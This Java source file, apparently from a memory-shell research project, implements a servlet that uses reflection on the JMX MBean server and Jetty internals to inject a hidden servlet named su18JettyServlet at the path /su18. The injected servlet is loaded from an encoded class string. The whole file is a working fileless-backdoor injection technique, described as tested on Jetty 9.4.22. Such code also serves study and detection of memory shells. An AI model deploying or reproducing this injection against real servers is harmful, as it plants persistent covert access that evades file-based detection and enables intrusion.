package org.su18.memshell.test.jetty;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;

import javax.management.ObjectName;
import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Set;

import static org.su18.memshell.test.jetty.DynamicUtils.SERVLET_CLASS_STRING;

/**
 * 来自项目 https://github.com/feihong-cs/memShell
 * 亲测有效
 * 测试版本 Jetty 9.4.22
 *
 * @author su18
 */
public class AddJettyServlet extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {
			String servletName = "su18JettyServlet";
			String urlPattern  = "/su18";

			JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();

			Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
			field.setAccessible(true);
			Object obj = field.get(mBeanServer);

			field = obj.getClass().getDeclaredField("repository");
			field.setAccessible(true);
			Field modifier = field.getClass().getDeclaredField("modifiers");
			modifier.setAccessible(true);
			modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
			Repository repository = (Repository) field.get(obj);

			Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
			for (NamedObject namedObject : namedObjectSet) {
				try {
					field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
					field.setAccessible(true);
					modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
					Object webAppContext = field.get(namedObject.getObject());

					field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
					field.setAccessible(true);
					Object handler = field.get(webAppContext);

					field = handler.getClass().getDeclaredField("_servlets");
					field.setAccessible(true);
					Object[] objects = (Object[]) field.get(handler);

					boolean flag = false;
					for (Object o : objects) {
						field = o.getClass().getSuperclass().getDeclaredField("_name");
						field.setAccessible(true);
						String name = (String) field.get(o);
						if (name.equals(servletName)) {
							flag = true;
							break;
						}
					}

					if (!flag) {
						ClassLoader classLoader = handler.getClass().getClassLoader();
						Class       sourceClazz = null;
						Object      holder      = null;
						try {
							sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
							field = sourceClazz.getDeclaredField("JAVAX_API");
							modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
							Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
							holder = method.invoke(handler, field.get(null));
						} catch (ClassNotFoundException e) {
							sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
							Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
							holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
						}

						holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
						Class clazz = DynamicUtils.getClass(SERVLET_CLASS_STRING);
						holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, clazz.newInstance());
						handler.getClass().getMethod("addServlet", holder.getClass()).invoke(handler, holder);

						clazz = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
						Object servletMapping = null;
						try {
							servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
						} catch (NoSuchMethodException e) {
							servletMapping = clazz.newInstance();
						}

						servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
						servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
						handler.getClass().getMethod("addServletMapping", clazz).invoke(handler, servletMapping);

						resp.getWriter().println("Jetty Servlet Added");
					}
				} catch (Exception e) {
					//pass
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}